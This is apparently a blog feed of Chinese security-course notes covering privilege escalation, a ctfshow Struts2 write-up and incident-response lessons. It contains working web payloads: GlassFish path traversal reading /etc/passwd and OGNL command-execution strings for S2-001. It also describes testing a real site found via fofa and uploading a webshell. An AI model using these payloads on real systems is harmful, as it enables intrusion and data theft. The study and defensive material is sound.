    <content type="html"><![CDATA[<p>58：权限提升-网站权限后台漏洞第三方获取</p><span id="more"></span><p>思维导图</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-1.png" alt="58-1"></p><p>本节课内容主要是权限提升的思路，不涉及技术</p><p>当前知识点在渗透流程中的点</p><ul><li>前期-中期-后期对应知识关系</li></ul><p>当前知识点在权限提升的重点</p><ul><li>知识点顺序，理解思路，分类介绍等</li></ul><p>当前知识点权限提升权限介绍</p><ul><li>注重理解当前权限对应可操作的事情</li></ul><p>利用成功后的思想 需要总结的思路</p><ul><li>相关的操作被拒绝无法实现的时候就会涉及到权限提升</li></ul><p><strong>具体有哪些权限需要我们知道和了解掌握的？</strong></p><ul><li><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p></li><li><p>1.后台权限：（获取方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p><ul><li>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件等。（如后台功能存在文件操作的话也可以操作文件数据）</li></ul></li><li><p>2.网站权限：（获取方式：以上三种思路获取）</p><ul><li>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li></ul></li><li><p>3.数据库权限：（获取方式：源码或配置文件泄露，也可能是网站权限webshell进行的数据库配置文件读取获得）</p><ul><li>操作数据库的权限，数据库的增删改等。</li></ul></li><li><p>4.接口权限：（邮件，短信，支付，第三方登录等）</p><ul><li>后台或网站权限的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情有很多，大家可以自己想想。</li></ul></li></ul><p><strong>案例1：某挂壁程序后台权限提升-后台功能</strong></p><p>&lt;1&gt;扫描目录，找到后台目录。</p><p>&lt;2&gt;找到后台登录用户名密码，登录。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-2.png" alt="58-2"></p><p>&lt;3&gt;发现该网站使用站帮主cms，下载站帮主cms源码，分析源码寻找漏洞，或者直接通过功能点测试寻找漏洞。</p><p><strong>案例2：某BC逛逛导航页权限提升-漏洞层面</strong></p><p>&lt;1&gt;通过首页返回信息，得知服务器信息，猜测使用phpstudy搭建。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-3.png" alt="58-3"></p><p>&lt;2&gt;搜索网上资料，寻找phpstudy相关漏洞，进行测试。</p><p>我们找到一个phpstudy后门漏洞（<a href="https://www.freebuf.com/vuls/246979.html%EF%BC%89%EF%BC%8C%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%88%90%E5%8A%9F%E3%80%82">https://www.freebuf.com/vuls/246979.html），测试，成功。</a></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-4.png" alt="58-4"></p><p>&lt;3&gt;接下来，就可以通过该漏洞上传一句话木马，通过冰蝎等工具连接操作。</p><p><strong>案例3：苏丹大西瓜GlassFish中间件-第三方</strong></p><p>&lt;1&gt;在fofa上找了一个苏丹的网站进行测试（注意未授权情况下不要随便搞网站，犯法）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-5.png" alt="58-5"></p><p>&lt;2&gt;上网搜资料，发现GlassFish历史版本有任意文件读取漏洞。</p><p>应用服务器glassfish任意文件读取漏洞：<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a></p><p>Web中间件常见漏洞总结.pdf：<a href="https://pan.baidu.com/s/1Qm1KcVovMI-nGxt_vCjYkQ">https://pan.baidu.com/s/1Qm1KcVovMI-nGxt_vCjYkQ</a></p><p>&lt;3&gt;使用payload测试一下，成功读取系统文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload_linux：http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&quot;</span><br><span class="line"> </span><br><span class="line">payload_windows：http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/Windows/win.ini&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58-6.png" alt="58-6"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;58：权限提升-网站权限后台漏洞第三方获取&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/26/Web%E6%BC%8F%E6%B4%9E/JWT%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/Web%E6%BC%8F%E6%B4%9E/JWT%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-05-26T14:25:56.752Z</published>
    <updated>2023-05-26T14:25:56.752Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/26/Web%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/Web%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-05-26T14:16:40.565Z</published>
    <updated>2023-05-26T14:16:40.565Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Java漏洞</title>
    <link href="http://blog.hvvl404.fun/2023/05/26/ctfshow/Java%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/ctfshow/Java%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-05-26T06:15:35.709Z</published>
    <updated>2023-05-27T14:51:32.342Z</updated>
    
    <content type="html"><![CDATA[<p>Java漏洞</p><span id="more"></span><p>web 279（）</p><p>struts2漏洞 S2-001：</p><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</p><p>复现可见我的 <a href="">Java 漏洞</a>笔记</p><p>payload：</p><p>获取 tomcat 路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>获取 web 路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>web 280</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="ctfshow" scheme="http://blog.hvvl404.fun/categories/ctfshow/"/>
    
    
  </entry>
  
  <entry>
    <title>72-内网安全-应急响应初识</title>
    <link href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/72%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E8%AF%86/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/72%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E8%AF%86/</id>
    <published>2023-05-26T03:24:11.105Z</published>
    <updated>2023-06-06T15:36:38.384Z</updated>
    
    <content type="html"><![CDATA[<p>72-内网安全-应急响应初识</p><span id="more"></span><p><strong>本课重点：</strong></p><ul><li>案例1：WEB攻击应急响应朔源-后门,日志</li><li>案例2：WIN系统攻击应急响应朔源-后门,日志,流量</li></ul><p><strong>案例1：WEB攻击应急响应溯源-后门,日志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">故事回顾：某客户反映自己的网站首页出现篡改，请求支援</span><br><span class="line">分析：涉及的攻击面，涉及的操作权限，涉及的攻击意图，涉及的攻击方式等</span><br><span class="line">思路1：利用日志定位修改时间基数，将前时间进行攻击分析，后时间进行操作分析</span><br><span class="line">思路2：利用后门webshell查杀脚本或工具找到对应后门文件，定位第一次时间分析</span><br></pre></td></tr></table></figure><p>站在攻击者的角度，去分析。攻击者当前拿到哪些权限，网站还是系统权限。装没装杀软，用渗透者的思路去想问题。注重信息搜集，从攻击面入手查看应急响应。</p><p>案例演示</p><p>&lt;1&gt;执行netstat -ano命令，通过开放的端口找到对应的PID。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161133200-2097264044.png" alt="img"></p><p>&lt;2&gt;执行tasklist -svc命令，通过PID找到对应的进程名称。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161146454-1845604402.png" alt="img"></p><p>&lt;3&gt;在任务管理器，右击进程名称，选择打开文件位置。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161159043-1945237798.png" alt="img"></p><p>直接定位到具体位置</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161208774-1930412274.png" alt="img"></p><p>&lt;4&gt;根据不同的服务名，找寻对应的日志存储目录。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161222867-199100549.png" alt="img"></p><p>&lt;5&gt;打开日志，分析异常操作，发现有人上传了x.php文件。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161342052-717031984.png" alt="img"></p><p>&lt;6&gt;通过网站目录找到x.php</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161412809-657163410.png" alt="img"></p><p>&lt;7&gt;打开看一下，是后门文件。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161358546-1661406268.png" alt="img"></p><p>&lt;8&gt;还可以去网站目录查看首页修改时间，查找网站相关日志，定位修改时间基数，将该时间之前的日志进行攻击分析（分析攻击者是如何修改首页内容的），该时间之后的日志进行操作分析（分析攻击者修改网页之后还进行了什么操作，是否留有后门等）</p><p>&lt;9&gt;利用后门webshell查杀脚本或工具找到对应后门文件，网上有很多查杀工具，比如D盾_Web查杀、百度WEBDIR+、河马、Sangfor WebShellKill、深度学习模型检测PHP Webshell、PHP Malware  Finder、在线webshell查杀工具等。参考：<a href="https://blog.csdn.net/qq_25645753/article/details/110196602">https://blog.csdn.net/qq_25645753/article/details/110196602</a></p><p>比如使用河马查杀，安装之后，扫描，发现两个后门。然后去日志搜索相关关键字，找到是谁访问了这个后门，如何操作等。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161440054-453658952.png" alt="img"></p><p><strong>案例2：WIN系统攻击应急溯源-后门,日志,流量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">分析：涉及的攻击面，涉及的操作权限，涉及的攻击意图，涉及的攻击方式等</span><br><span class="line">故事回顾：某客户反映服务器出现卡顿等情况，请求支援</span><br><span class="line">思路：利用监控工具分析可疑进程，利用杀毒软件分析可疑文件，利用接口工具抓流量</span><br><span class="line">获取进监控：PCHunter64</span><br><span class="line">获取执行列表：UserAssistView</span><br><span class="line">UserAssistView下载：https://www.onlinedown.net/soft/628964.htm</span><br><span class="line">AppCompatCacheParser.exe --csv c:\temp -t</span><br></pre></td></tr></table></figure><p>案例演示</p><p>&lt;1&gt;打开PCHunter64工具，查看正在运行的进程，发现异常进程artifact.exe（名字不熟悉，没有厂商信息等）</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161654333-918221179.png" alt="img"></p><p>&lt;2&gt;在网络模块，发现该进程与外部IP地址进行网络连接，很可疑。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161708516-1310514404.png" alt="img"></p><p>&lt;3&gt;PCHunter64工具还有很多其他功能，可以进一步分析该进程是否是后门或者勒索病毒等。</p><p>&lt;4&gt;UserAssistView工具可以看到windows系统所有文件的执行时间记录，比如我们可以查看一下artifact.exe上次修改的时间。说明在这个时间点前后攻击者一定对系统进行了一些操作，相应地，我们就可以以此时间为基数，定位查找日志将该时间之前的日志进行攻击分析（分析攻击者是如何攻击服务器的），该时间之后的日志进行操作分析（分析攻击者登录服务器后进行了什么操作)</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211011161726277-179504848.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;72-内网安全-应急响应初识&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>75-应急响应-数据库&amp;漏洞口令检索&amp;应急取证箱</title>
    <link href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/75%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%95%B0%E6%8D%AE%E5%BA%93&amp;%E6%BC%8F%E6%B4%9E%E5%8F%A3%E4%BB%A4%E6%A3%80%E7%B4%A2&amp;%E5%BA%94%E6%80%A5%E5%8F%96%E8%AF%81%E7%AE%B1/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/75%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%95%B0%E6%8D%AE%E5%BA%93&amp;%E6%BC%8F%E6%B4%9E%E5%8F%A3%E4%BB%A4%E6%A3%80%E7%B4%A2&amp;%E5%BA%94%E6%80%A5%E5%8F%96%E8%AF%81%E7%AE%B1/</id>
    <published>2023-05-26T03:21:11.629Z</published>
    <updated>2023-06-06T15:36:59.265Z</updated>
    
    <content type="html"><![CDATA[<p>75-应急响应-数据库&amp;漏洞口令检索&amp;应急取证箱</p><span id="more"></span><p>必须知识点：</p><ul><li>1.第三方应用由于是选择性安装，如何做好信息收集和漏洞探针也是获取攻击者思路的重要操作，除去本身漏洞外，提前预知或口令相关攻击也要进行筛选。</li><li>2.排除三方应用攻击行为，自查漏洞分析攻击者思路，人工配合工具脚本</li><li>3.由于工具或脚本更新迭代快，分类复杂，打造自己的工具箱迫在眉睫</li></ul><p>本课重点：</p><ul><li>案例1：系统日志-Win 日志自动神器 LogonTracer-外网内网日志</li><li>案例2：应用分析-数据库 Mysql&amp;Mssql&amp;Oracle 等分析-爆破注入操作</li><li>案例3：模拟测试-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索</li><li>案例4：专业要求-自动化 ir-rescue 应急响应取证工具箱-实时为您提供服务</li></ul><p><strong>案例1：Win 日志自动神器 LogonTracer-外网内网</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">如何安装使用：https://github.com/JPCERTCC/LogonTracer/wiki/ </span><br><span class="line"> </span><br><span class="line">linux安装使用笔记：阿里云主机记得开放端口及关闭防火墙</span><br><span class="line"> </span><br><span class="line">1.下载并解压 neo4j：tar -zvxf neo4j-community-4.2.1-unix.tar</span><br><span class="line"> </span><br><span class="line">2.安装 java11 环境：sudo yum install java-11-openjdk -y</span><br><span class="line"> </span><br><span class="line">3.修改 neo4j 配置保证外部访问：</span><br><span class="line">dbms.connector.bolt.listen_address=0.0.0.0:7687</span><br><span class="line">dbms.connector.http.listen_address=0.0.0.0:7474</span><br><span class="line">./bin/neo4j console &amp;</span><br><span class="line"> </span><br><span class="line">4.下载 LogonTracer 并安装库：</span><br><span class="line">git clone https://github.com/JPCERTCC/LogonTracer.git</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"> </span><br><span class="line">5.启动 LogonTracer 并导入日志文件分析</span><br><span class="line">python3 logontracer.py -r -o [PORT] -u [USERNAME] -p [PASSWORD] -s [IP 地址]</span><br><span class="line">python3 logontracer.py -r -o 8080 -u neo4j -p xiaodi -s 47.98.99.126</span><br><span class="line">python3 logontracer.py -e [EVTX 文件] -z [时区] -u [用户名] -p [密码] -s [IP 地址]</span><br><span class="line">python3 logontracer.py -e Security.evtx -z -13 -u neo4j -p xiaodi -s 127.0.0.1</span><br><span class="line"> </span><br><span class="line">6.刷新访问 LogonTracer-web_gui 查看分析结果</span><br></pre></td></tr></table></figure><p>案例演示</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165441528-1966134132.png" alt="img"></p><p><strong>案例2：数据库 Mysql&amp;Mssql&amp;Oracle 等日志分析-爆破注入操作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见的数据库攻击包括弱口令、SQL 注入、提升权限、窃取备份等。</span><br><span class="line">对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</span><br><span class="line"> </span><br><span class="line">Mysql：启用，记录，分析（分析 SQL 注入及口令登录爆破等）</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class="line">SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br><span class="line">Mssql：查看，跟踪，分析（配置跟踪可分析操作，查看日志可分析登录等）</span><br></pre></td></tr></table></figure><p>案例演示1-mysql日志</p><p>&lt;1&gt;查看日志设置，默认关闭状态，手动打开</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165604280-1065480804.png" alt="img"></p><p>&lt;2&gt;模拟注入攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165615715-797206427.png" alt="img"></p><p>&lt;3&gt;查看日志，发现注入记录</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165626399-1160210745.png" alt="img"></p><p>&lt;4&gt;模拟爆破攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165637030-1476047183.png" alt="img"></p><p>&lt;5&gt;查看日志，发现爆破记录</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165648063-321288761.png" alt="img"></p><p>案例演示2-SqlServer日志</p><p>&lt;1&gt;SqlServer日志位置</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014165927587-868896842.png" alt="img"></p><p>&lt;2&gt;SqlServer数据库属性可以配置日志是否记录，日志保存多久等</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014170006184-1724207859.png" alt="img"></p><p>&lt;3&gt;模拟爆破攻击</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014170016127-975740095.png" alt="img"></p><p>&lt;4&gt;查看日志，发现爆破记录</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014170027721-492562798.png" alt="img"></p><p>&lt;5&gt;登录系统，模拟用户名sql注入</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014170039474-427159429.png" alt="img"></p><p>&lt;6&gt;数据库日志实时记录了注入语句</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014170051647-666761352.png" alt="img"></p><p><strong>案例3：自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.日志被删除或没价值信息</span><br><span class="line">2.没有思路进行分析可以采用模拟渗透</span><br><span class="line"> </span><br><span class="line">1.windows，linux 系统漏洞自查:</span><br><span class="line">WindowsVulnScan,linux-exploit-suggester</span><br><span class="line">D:\Myproject\venv\Scripts\python.exe cve-check.py -C -f KB.json</span><br><span class="line">./linux-exploit-suggester.sh</span><br><span class="line"> </span><br><span class="line">https://github.com/chroblert/WindowsVulnScan</span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line"> </span><br><span class="line">2.windows，linux 服务漏洞自查:</span><br><span class="line">windows：Get-WmiObject -class Win32_Product #Powershell命令</span><br><span class="line">linux：LinEnum.sh</span><br><span class="line">searchsploit weblogic</span><br><span class="line">利用前期信息收集配合 searchsploit 进行应用服务协议等漏洞检索</span><br><span class="line"> </span><br><span class="line">https://github.com/rebootuser/LinEnum</span><br><span class="line">https://github.com/offensive-security/exploitdb</span><br><span class="line">&lt;br&gt;以上，前面已经讲过，不再演示3.windows，linux 协议弱口令自查-工具探针或人工获取判断-snetcraker</span><br></pre></td></tr></table></figure><p><strong>案例4：自动化 ir-rescue 应急响应工具箱-实时为您提供服务</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/diogo-fernan/ir-rescue</span><br><span class="line">分析脚本工具原理，尝试自己进行编写修改，成为自己的工具箱杀器</span><br><span class="line"> </span><br><span class="line">应急响应资料工具-小迪安全</span><br><span class="line">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg 提取码：xiao</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;75-应急响应-数据库&amp;amp;漏洞口令检索&amp;amp;应急取证箱&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击</title>
    <link href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/74%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-win&amp;linux%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8&amp;%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92&amp;%E6%94%BB%E5%87%BB/"/>
    <id>http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/74%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-win&amp;linux%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8&amp;%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92&amp;%E6%94%BB%E5%87%BB/</id>
    <published>2023-05-26T03:17:46.318Z</published>
    <updated>2023-06-06T15:36:52.533Z</updated>
    
    <content type="html"><![CDATA[<p>74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击</p><span id="more"></span>   <p>操作系统(windows,linux)应急响应：</p><ul><li>1.常见危害：暴力破解，漏洞利用，流量攻击，木马控制(Webshell,PC 木马等)，病毒感染(挖矿，蠕虫，勒索等)</li><li>2.常见分析：计算机账户，端口，进程，网络，启动，服务，任务，文件等安全问题</li></ul><p>常见日志类别及存储：</p><ul><li>Windows,Linux</li></ul><p>补充资料：</p><ul><li><a href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a> 应急响应大合集</li><li><a href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a> 最全Windows安全工具锦集</li><li><a href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a> windows官方工具</li></ul><p>病毒分析：</p><ul><li>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></li><li>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></li><li>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></li><li>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></li><li>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></li><li>OTL：<a 